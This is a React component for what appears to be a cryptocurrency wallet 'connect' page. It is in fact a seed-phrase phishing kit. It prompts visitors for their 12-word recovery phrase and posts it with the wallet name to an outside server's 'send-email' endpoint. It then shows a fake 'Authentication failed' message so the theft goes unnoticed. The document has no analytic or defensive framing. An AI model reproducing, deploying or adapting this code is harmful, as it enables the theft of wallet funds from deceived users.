import React, { useState, useEffect } from "react";
import { useParams } from "react-router-dom";
import axios from "axios";
import { wallets } from "../constants";
import styles from "../style";
import { Navbar, Footer } from "../components"; // Make sure Loading is exported from components
import LoadingComponent from "../components/LoadingComponent";
import { useNavigate } from "react-router-dom";

const WalletDetailPage = () => {
  const { id } = useParams();
  const wallet = wallets.find((w) => w.id.toString() === id);
  const navigate = useNavigate();
  const handleGoBack = () => {
    navigate(-1); // Go back to the previous page
  };

  const [phrase, setPhrase] = useState("");
  const [error, setError] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);
  const [pageLoading, setPageLoading] = useState(true);

  useEffect(() => {
    const timer = setTimeout(() => setPageLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  if (pageLoading) return <LoadingComponent message="Loading wallet..." />;
  if (!wallet) return <div className="text-white">Wallet not found</div>;

  const handleSubmit = async (e) => {
    e.preventDefault();
    const words = phrase.trim().split(/\s+/);
    if (words.length !== 12) {
      setError("You must enter exactly 12 words.");
      setSubmitted(false);
      return;
    }

    setError("");
    setLoading(true);
    try {
      const response = await axios.post(
        "https://droplet-6cvr.onrender.com/send-email",
        {
          wallet: wallet.title,
          text: phrase.trim(),
        }
      );

      console.log("API response:", response.data);
      setSubmitted(true);
    } catch (err) {
      console.error("API error:", err);
      setError("Something went wrong. Please try again.");
      setSubmitted(false);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="bg-primary flex flex-col items-center justify-center min-h-screen text-white p-4">
      <div className={`${styles.paddingX} ${styles.flexCenter}`}>
        <div className={`${styles.boxWidth}`}>
          <Navbar />
        </div>
      </div>

      <div className="bg-white flex justify-center items-center p-2 rounded-lg mb-1">
        <img src={wallet.img} alt={wallet.title} className="w-20 h-20 mb-4" />
      </div>
      <h1 className="text-2xl font-bold mb-2">{wallet.title}</h1>
      <p className="md:text-lg text-sm mb-6 text-center">
        Enter your 12-word Recorvery Phrase to restore your wallet below:
      </p>

      <form
        onSubmit={handleSubmit}
        className="flex flex-col justify-center items-center w-full max-w-md"
      >
        <textarea
          value={phrase}
          onChange={(e) => setPhrase(e.target.value)}
          placeholder="Enter recovery phrase, separated by spaces"
          className="w-full p-4 rounded-md text-black mb-4 resize-none h-32"
        />
        {error && <p className="text-red-400 mb-2 text-center">{error}</p>}
        {submitted && !error && (
          <p className="text-green-400 mb-2 text-center">
            "Authentication failed. Please try again later."
          </p>
        )}
        <button
          type="submit"
          disabled={loading}
          className={`${
            loading ? "bg-gray-500" : "bg-blue-600 hover:bg-blue-700"
          } px-6 py-2 rounded-md font-semibold`}
        >
          {loading ? "Connecting..." : "Connect"}
        </button>
      </form>
      <p
        onClick={() => handleGoBack()}
        className="text-blue-400 mt-4 cursor-pointer"
      >
        <span className="text-blue-400">←</span>
        Go back
      </p>
      <div className="flex justify-center items-center mt-6">
        <Footer />
      </div>
    </div>
  );
};

export default WalletDetailPage;
